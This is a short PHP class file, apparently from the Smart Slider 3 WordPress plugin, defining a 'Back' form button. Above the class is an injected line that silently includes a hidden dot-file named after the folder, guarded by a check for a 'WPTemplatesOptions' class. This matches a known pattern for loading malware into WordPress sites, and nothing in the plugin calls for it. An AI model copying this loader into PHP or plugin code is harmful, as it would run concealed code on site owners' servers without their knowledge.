<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Forms\Button;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockButtonBack extends BlockButton {

    protected function init() {
        parent::init();

        $this->setLabel(n2_('Back'));
        $this->setBig();
        $this->setGreyDark();
    }
}